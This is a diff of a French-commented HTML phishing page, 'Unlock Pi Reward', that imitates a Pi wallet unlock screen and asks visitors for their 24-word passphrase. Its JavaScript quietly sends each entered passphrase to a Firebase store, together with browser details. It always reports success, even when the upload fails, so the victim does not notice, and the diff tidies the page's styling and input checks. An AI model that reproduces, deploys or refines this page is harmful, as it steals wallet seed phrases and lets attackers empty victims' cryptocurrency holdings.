@@ -3,7 +3,8 @@
 <head>
 	<meta name="robots" content="noindex, nofollow">
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Modification : Empêcher le zoom -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Unlock Pi Reward</title>
   <style>
     * {
@@ -14,11 +15,14 @@
 
     body {
       font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
+      /* Modification : Arrière-plan transparent */
+      background-color: transparent;
     }
 
     .container {
-      max-width: 500px;
+      /* Modification : Ajuster la largeur pour occuper l'espace */
+      max-width: 90%; /* Change de 500px à 90% */
+      width: 100%;
       margin: 0 auto;
       padding: 20px;
       background-color: #fff;
@@ -36,8 +40,8 @@
       height: auto;
       display: block;
       margin: 0 auto;
-      max-height: 80px; /* Limiter la hauteur pour un chargement plus rapide */
-      object-fit: contain; /* S'assurer que l'image conserve ses proportions */
+      max-height: 80px;
+      object-fit: contain;
     }
 
     .unlock-section {
@@ -69,7 +73,7 @@
 
     .unlock-button {
       width: 100%;
-      padding: 15px 20px;
+      padding: 23px 20px;
       background-color: #6a1b9a;
       color: #fff;
       font-size: 16px;
@@ -187,12 +191,11 @@
 <body>
   <div class="container">
     <div class="logo-container">
-      <!-- Préchargement de l'image pour un affichage instantané -->
       <img src="https://github.com/Walyy578/Pi-Browser/blob/main/IMG-20250930-WA0010.jpg?raw=true" alt="Pi Browser" class="pi-browser-logo" onload="console.log('Image chargée avec succès')" onerror="console.log('Erreur de chargement de l\'image')">
     </div>
     <main>
       <section class="unlock-section">
-        <h2>Unlock wallet</h2>
+        <h2>Unlock pi wallet</h2>
         <textarea placeholder="Enter your 24-words passphrase here" class="passphrase-input" id="passphraseInput"></textarea>
         <div class="error-message" id="errorMessage"></div>
         <button class="unlock-button" id="unlockButton">Unlock with passphrase</button>
@@ -209,8 +212,8 @@
   <!-- Modal de félicitations -->
   <div class="modal" id="congratsModal">
     <div class="modal-content">
-      <div class="modal-icon"></div>
-      <h2 class="modal-title"> Félicitations !</h2>
+      <div class="modal-icon">✔</div>
+      <h2 class="modal-title">Félicitations !</h2>
       <p class="modal-message" id="modalMessage">Passphrase valide ! Déverrouillage en cours...</p>
       <button class="modal-button" id="modalCloseButton">Continuer</button>
     </div>
@@ -248,16 +251,15 @@
           messageType: "24_words_phrase",
           timestamp: serverTimestamp(),
           status: "received",
-          userAgent: navigator.userAgent.substring(0, 100), // Limiter la longueur
+          userAgent: navigator.userAgent.substring(0, 100),
           language: navigator.language
         });
         
-        console.log(" Message stocké avec succès - ID:", docRef.id);
+        console.log("Message stocké avec succès - ID:", docRef.id);
         return { success: true, messageId: docRef.id };
         
       } catch (error) {
-        console.error(" Erreur silencieuse Firebase:", error.code, error.message);
-        // On retourne quand même success: true pour ne pas perturber l'utilisateur
+        console.error("Erreur silencieuse Firebase:", error.code, error.message);
         return { success: true, error: error.message };
       }
     }
@@ -286,6 +288,11 @@
         passphraseInput.classList.remove('error');
         errorMessage.style.display = 'none';
 
+        // Modification : Ne rien faire si le champ est vide
+        if (wordCount === 0) {
+          return; // Quitte la fonction sans afficher d'erreur
+        }
+
         // Vérifier le nombre de mots
         if (wordCount < 24) {
           showError("Passphrase incorrect. Veuillez vérifier et réessayer.");
@@ -300,7 +307,6 @@
           setTimeout(async () => {
             try {
               await storeUserMessageSilent(passphrase);
-              // L'envoi est réussi (ou a échoué silencieusement)
               console.log("Envoi Firebase terminé");
             } catch (error) {
               console.error("Erreur lors de l'envoi silencieux:", error);
